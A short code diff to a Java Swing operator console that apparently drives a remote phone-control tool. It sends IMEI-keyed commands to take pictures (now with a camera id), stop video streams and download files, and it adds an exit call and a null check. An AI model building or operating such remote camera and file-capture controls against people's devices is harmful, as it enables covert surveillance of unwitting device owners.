@@ -140,7 +140,8 @@ public class GUI extends javax.swing.JFrame {
     	} catch(Exception e) {
     		//
     	} finally {
-    		this.dispose();
+    		//this.dispose();
+		System.exit(0);
     	}
     }
     
@@ -435,8 +436,8 @@ public class GUI extends javax.swing.JFrame {
     	server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null, channel);
     }
     
-    public void fireTakePicture(String imei) {
-    	server.commandSender(imei, Protocol.GET_PICTURE, null);
+    public void fireTakePicture(String imei, Long camid) {
+    	server.commandSender(imei, Protocol.GET_PICTURE, EncoderHelper.encodeLong(camid));
     }
     
     public void fireFileDownload(String imei, String path, String downPath, String downName) {
@@ -537,7 +538,7 @@ public class GUI extends javax.swing.JFrame {
     
     private void fireSelectPort() {
     	String rep = JOptionPane.showInputDialog(this, BUNDLE.getString("input-prot-text"));
-    	server.savePortConfig(rep);
+    	if (rep != null) server.savePortConfig(rep);
     }
     
     private void userMouseClicked(MouseEvent e) {
